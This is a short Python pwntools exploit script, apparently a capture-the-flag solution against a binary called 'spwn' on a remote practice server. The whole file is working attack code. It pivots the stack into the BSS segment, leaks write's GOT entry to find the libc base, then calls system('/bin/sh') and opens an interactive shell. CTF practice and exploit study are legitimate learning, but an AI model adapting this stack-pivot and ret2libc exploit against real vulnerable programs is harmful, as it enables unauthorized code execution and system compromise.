from pwn import *

#io=process('./spwn')
io=remote('node3.buuoj.cn',25288)
context.terminal = ['gnome-terminal','-x','sh','-c']    
bss=0x804A300
vul=0x804849B
leave=0x8048511
write_plt=0x8048380
write_got=0x804A01C

rop='bbbb'+p32(write_plt)+p32(vul)+p32(1)+p32(write_got)+p32(4)
pl='a'*0x18+p32(bss)+p32(leave)

io.recvuntil("name?")
io.send(rop)
io.recvuntil("to say?")
io.send(pl)
write_add=u32(io.recv(4))
print(hex(write_add))
libc_base=write_add-0x0d43c0
sys=libc_base+0x03a940
sh=libc_base+0x15902b
io.recvuntil("name?")
io.send("cccc"*3+p32(sys)+p32(vul)+p32(sh))
io.recvuntil("to say?")
io.send("bbbb")

io.interactive()